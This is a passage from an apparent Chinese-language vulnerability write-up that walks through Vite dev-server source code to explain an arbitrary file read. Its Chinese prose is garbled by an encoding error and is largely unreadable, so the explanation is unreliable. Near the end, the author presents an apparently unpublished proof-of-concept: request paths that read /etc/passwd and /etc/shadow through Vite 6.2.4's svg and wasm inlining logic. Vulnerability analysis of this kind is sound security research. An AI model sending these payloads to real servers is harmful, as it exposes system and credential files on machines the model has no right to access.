class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        req.<span class="property">headers</span>[<span class="string">&#x27;sec-fetch-dest&#x27;</span>] === <span class="string">&#x27;script&#x27;</span> ||</span><br><span class="line">        <span class="title function_">isJSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isImportRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isCSSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isHTMLProxy</span>(url)</span><br><span class="line">      ) &#123;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br></pre></td></tr></table></figure><p>åŒ¹é…åˆ°äº†ï¼Œè¿›å…¥ifè¯­å¥ã€‚è¿›è¡Œä¸€æ¬¡removeImportQuery(url)ã€‚</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"><span class="keyword">const</span> trailingSeparatorRE = <span class="regexp">/[?&amp;]$/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeImportQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡removeImportQueryåurlå°±å˜æˆäº†<code>/@fs/etc/passwd??inline=1.wasm?init</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> url = <span class="string">&quot;/@fs/etc/passwd?import&amp;?inline=1.wasm?init&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span>;</span><br><span class="line"><span class="keyword">const</span> newUrl = url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newUrl); </span><br><span class="line"></span><br><span class="line"><span class="comment">//   /@fs/etc/passwd??inline=1.wasm?init</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿›å…¥transformRequest</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">transformRequest</span>(environment, url, &#123;</span><br><span class="line">          <span class="attr">html</span>: req.<span class="property">headers</span>.<span class="property">accept</span>?.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>),</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å¯¹urlè¿›è¡Œä»€ä¹ˆæ“ä½œï¼Œç›´æ¥è·Ÿè¿›doTransform</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="title function_">doTransform</span>(environment, url, options, timestamp)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">doTransform</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">DevEnvironment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">options</span>: <span class="title class_">TransformOptions</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">timestamp</span>: <span class="built_in">number</span>,</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  url = <span class="title function_">removeTimestampQuery</span>(url)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; pluginContainer &#125; = environment</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="variable language_">module</span> = <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleByUrl</span>(url)</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">module</span>) &#123;</span><br><span class="line">    <span class="comment">// try use cache from url</span></span><br><span class="line">    <span class="keyword">const</span> cached = <span class="keyword">await</span> <span class="title function_">getCachedTransformResult</span>(</span><br><span class="line">      environment,</span><br><span class="line">      url,</span><br><span class="line">      <span class="variable language_">module</span>,</span><br><span class="line">      timestamp,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> (cached) <span class="keyword">return</span> cached</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> resolved = <span class="variable language_">module</span></span><br><span class="line">    ? <span class="literal">undefined</span></span><br><span class="line">    : ((<span class="keyword">await</span> pluginContainer.<span class="title function_">resolveId</span>(url, <span class="literal">undefined</span>)) ?? <span class="literal">undefined</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// resolve</span></span><br><span class="line">  <span class="keyword">const</span> id = <span class="variable language_">module</span>?.<span class="property">id</span> ?? resolved?.<span class="property">id</span> ?? url</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">module</span> ??= environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleById</span>(id)</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">module</span>) &#123;</span><br><span class="line">    <span class="comment">// if a different url maps to an existing loaded id,  make sure we relate this url to the id</span></span><br><span class="line">    <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">_ensureEntryFromUrl</span>(url, <span class="literal">undefined</span>, resolved)</span><br><span class="line">    <span class="comment">// try use cache from id</span></span><br><span class="line">    <span class="keyword">const</span> cached = <span class="keyword">await</span> <span class="title function_">getCachedTransformResult</span>(</span><br><span class="line">      environment,</span><br><span class="line">      url,</span><br><span class="line">      <span class="variable language_">module</span>,</span><br><span class="line">      timestamp,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> (cached) <span class="keyword">return</span> cached</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">    environment,</span><br><span class="line">    id,</span><br><span class="line">    url,</span><br><span class="line">    options,</span><br><span class="line">    timestamp,</span><br><span class="line">    <span class="variable language_">module</span>,</span><br><span class="line">    resolved,</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; depsOptimizer &#125; = environment</span><br><span class="line">  <span class="keyword">if</span> (!depsOptimizer?.<span class="title function_">isOptimizedDepFile</span>(id)) &#123;</span><br><span class="line">    environment.<span class="title function_">_registerRequestProcessing</span>(id, <span class="function">() =&gt;</span> result)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯¹urlè¿›è¡Œä¸€æ¬¡removeTimestampQueryï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆæ•ˆæœã€‚</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">    environment,</span><br><span class="line">    id,</span><br><span class="line">    url,</span><br><span class="line">    options,</span><br><span class="line">    timestamp,</span><br><span class="line">    <span class="variable language_">module</span>,</span><br><span class="line">    resolved,</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›loadAndTransformåï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loadResult = <span class="keyword">await</span> pluginContainer.<span class="title function_">load</span>(id)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">load</span>(<span class="params">id</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (id === wasmHelperId) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`export default <span class="subst">$&#123;wasmHelperCode&#125;</span>`</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!id.<span class="title function_">endsWith</span>(<span class="string">&#x27;.wasm?init&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> url = <span class="keyword">await</span> <span class="title function_">fileToUrl</span>(<span class="variable language_">this</span>, id)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">import initWasm from &quot;<span class="subst">$&#123;wasmHelperId&#125;</span>&quot;</span></span><br><span class="line"><span class="string">export default opts =&gt; initWasm(opts, <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(url)&#125;</span>)</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¿›å…¥fileToUrlï¼ç„¶åè¿›å…¥fileToDevUrlã€‚</p><p>è¿›å…¥ifè¯­å¥ï¼š<code>/@fs/etc/passwd??inline=1.wasm?init</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> inlineRE = <span class="regexp">/[?&amp;]inline\b/</span></span><br><span class="line"><span class="keyword">const</span> svgExtRE = <span class="regexp">/\.svg(?:$|\?)/</span></span><br><span class="line"><span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥ifè¯­å¥åè¿›è¡Œä¸€æ¬¡Urlçš„æ¸…æ´—</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> postfixRE = <span class="regexp">/[?#].*$/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">cleanUrl</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(postfixRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fileä¹Ÿå°±ç­‰äº&#x2F;@fs&#x2F;etc&#x2F;passwdäº†ï¼ç„¶åreadFileåèµ‹å€¼ä¸ºcontentã€‚æœ€åè¿›è¡Œå›æ˜¾ï¼</p><h3 id="æœªå…¬å¼€POC"><a href="#æœªå…¬å¼€POC" class="headerlink" title="æœªå…¬å¼€POC"></a>æœªå…¬å¼€POC</h3><p>çœ‹ä¸€ä¸‹æœ€æ–°çš„commitï¼Œå‘ç°å¤šäº†å¯¹äºsvgçš„åˆ¤æ–­ã€‚è¿™ä¸ªpocæ˜¯å¯ä»¥æ‰“6.2.4çš„ã€‚</p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹fileToDevUrl</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> svgExtRE = <span class="regexp">/\.svg(?:$|\?)/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fileToDevUrl</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">Environment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">id</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  skipBase = <span class="literal">false</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> config = environment.<span class="title function_">getTopLevelConfig</span>()</span><br><span class="line">  <span class="keyword">const</span> publicFile = <span class="title function_">checkPublicFile</span>(id, config)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If has inline query, unconditionally inline the asset</span></span><br><span class="line">  <span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If is svg and it&#x27;s inlined in build, also inline it in dev to match</span></span><br><span class="line">  <span class="comment">// the behaviour in build due to quote handling differences.</span></span><br><span class="line">  <span class="keyword">if</span> (svgExtRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">shouldInline</span>(environment, file, id, content, <span class="literal">undefined</span>, <span class="literal">undefined</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å…¶ä¸­ä¸çŸ¥æœ‰inlineREï¼Œè¿˜æœ‰ä¸€ä¸ªsvgExtREï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡svgæ¥è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚</p><p>é‚£ä¹ˆå°±æœ‰è¿™æ ·çš„pocï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init</span><br><span class="line"></span><br><span class="line">/@fs/etc/shadow?meteorkai.svg?.wasm?init  //è¿™é‡Œæ²¡æœ‰importæ˜¯å› ä¸ºè¯»å–çš„æ–‡ä»¶æ²¡æœ‰åç¼€ï¼ŒisJSRequestä¸ºtrue</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è·Ÿä¸€évite6.2.4å…ˆã€‚</p><p>ç”±äºæœ€æœ«å°¾æ²¡æœ‰<code>?</code>ä¹‹ç±»çš„ï¼Œæˆ‘ä»¬ç›´æ¥è¿›å…¥ä¸‹é¢çš„ifè¯­å¥ï¼š</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        (rawRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          urlRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          inlineRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators)) &amp;&amp;</span><br><span class="line">        !<span class="title function_">ensureServingAccess</span>(</span><br><span class="line">          urlWithoutTrailingQuerySeparators,</span><br><span class="line">          server,</span><br><span class="line">          res,</span><br><span class="line">          next,</span><br><span class="line">        )</span><br><span class="line">      )</span><br></pre></td></tr></table></figure><p>è¦æ±‚rawREï¼ŒurlREï¼ŒinlineREå‡ä¸ºfalseæ‰è¡Œï¼Œè‡ªç„¶æ˜¯å¯ä»¥çš„ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥è¿›å…¥ä¸‹é¢çš„ifè¯­å¥ï¼š</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        req.<span class="property">headers</span>[<span class="string">&#x27;sec-fetch-dest&#x27;</span>] === <span class="string">&#x27;script&#x27;</span> ||</span><br><span class="line">        <span class="title function_">isJSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isImportRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isCSSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isHTMLProxy</span>(url)</span><br><span class="line">      )</span><br></pre></td></tr></table></figure><p>isImportRequestä¸ºtrueï¼Œç›´æ¥è¿›å…¥ifè¯­å¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = removeImportQuery(url)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"><span class="keyword">const</span> trailingSeparatorRE = <span class="regexp">/[?&amp;]$/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeImportQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡removeImportQueryåurlå˜æˆäº†<code>/@fs/etc/passwd??meteorkai.svg?.wasm?init</code></p><p>ç„¶åè¿›å…¥transformRequest</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">transformRequest</span>(environment, url, &#123;</span><br><span class="line">          <span class="attr">html</span>: req.<span class="property">headers</span>.<span class="property">accept</span>?.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>),</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>æ¥ç€è·Ÿè¿›doTransform</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="title function_">doTransform</span>(environment, url, options, timestamp)</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›loadAndTransform</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">    environment,</span><br><span class="line">    id,</span><br><span class="line">    url,</span><br><span class="line">    options,</span><br><span class="line">    timestamp,</span><br><span class="line">    <span class="variable language_">module</span>,</span><br><span class="line">    resolved,</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥loadå‡½æ•°</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">load</span>(<span class="params">id</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (id === wasmHelperId) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`export default <span class="subst">$&#123;wasmHelperCode&#125;</span>`</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!id.<span class="title function_">endsWith</span>(<span class="string">&#x27;.wasm?init&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> url = <span class="keyword">await</span> <span class="title function_">fileToUrl</span>(<span class="variable language_">this</span>, id)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">import initWasm from &quot;<span class="subst">$&#123;wasmHelperId&#125;</span>&quot;</span></span><br><span class="line"><span class="string">export default opts =&gt; initWasm(opts, <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(url)&#125;</span>)</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>è¿›å…¥fileToUrlã€‚å†è·Ÿè¿›fileToDevUrlã€‚</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fileToDevUrl</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">Environment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">id</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  skipBase = <span class="literal">false</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> config = environment.<span class="title function_">getTopLevelConfig</span>()</span><br><span class="line">  <span class="keyword">const</span> publicFile = <span class="title function_">checkPublicFile</span>(id, config)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If has inline query, unconditionally inline the asset</span></span><br><span class="line">  <span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If is svg and it&#x27;s inlined in build, also inline it in dev to match</span></span><br><span class="line">  <span class="comment">// the behaviour in build due to quote handling differences.</span></span><br><span class="line">  <span class="keyword">if</span> (svgExtRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">shouldInline</span>(environment, file, id, content, <span class="literal">undefined</span>, <span class="literal">undefined</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">rtn</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="keyword">if</span> (publicFile) &#123;</span><br><span class="line">    <span class="comment">// in public dir during dev, keep the url as-is</span></span><br><span class="line">    rtn = id</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (id.<span class="title function_">startsWith</span>(<span class="title function_">withTrailingSlash</span>(config.<span class="property">root</span>))) &#123;</span><br><span class="line">    <span class="comment">// in project root, infer short public path</span></span><br><span class="line">    rtn = <span class="string">&#x27;/&#x27;</span> + path.<span class="property">posix</span>.<span class="title function_">relative</span>(config.<span class="property">root</span>, id)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// outside of project root, use absolute fs path</span></span><br><span class="line">    <span class="comment">// (this is special handled by the serve static middleware</span></span><br><span class="line">    rtn = path.<span class="property">posix</span>.<span class="title function_">join</span>(<span class="variable constant_">FS_PREFIX</span>, id)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (skipBase) &#123;</span><br><span class="line">    <span class="keyword">return</span> rtn</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> base = <span class="title function_">joinUrlSegments</span>(config.<span class="property">server</span>.<span class="property">origin</span> ?? <span class="string">&#x27;&#x27;</span>, config.<span class="property">decodedBase</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">joinUrlSegments</span>(base, <span class="title function_">removeLeadingSlash</span>(rtn))</span><br><span 